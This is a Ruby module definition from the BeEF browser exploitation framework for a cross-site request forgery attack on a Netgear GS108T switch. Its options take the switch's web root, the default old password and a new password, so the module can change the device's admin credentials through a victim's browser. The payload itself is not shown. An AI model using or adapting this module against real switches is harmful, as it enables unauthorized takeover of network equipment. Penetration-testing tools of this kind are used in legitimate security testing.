#
#   Copyright 2012 Bart Leppens
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Netgear_gs108t_csrf < BeEF::Core::Command
  
  def self.options
    return [
        {'name' => 'base', 'ui_label' => 'Switch web root', 'value' => 'http://192.168.0.139/'}, 
        {'name' => 'oldpassword', 'ui_label' => 'Old Password', 'value' => 'password'}, 
        {'name' => 'newpassword', 'ui_label' => 'Desired password', 'value' => '__BeEF__'}
    ]
  end
  
  def post_execute
    save({'result' => @datastore['result']})
  end
  
end
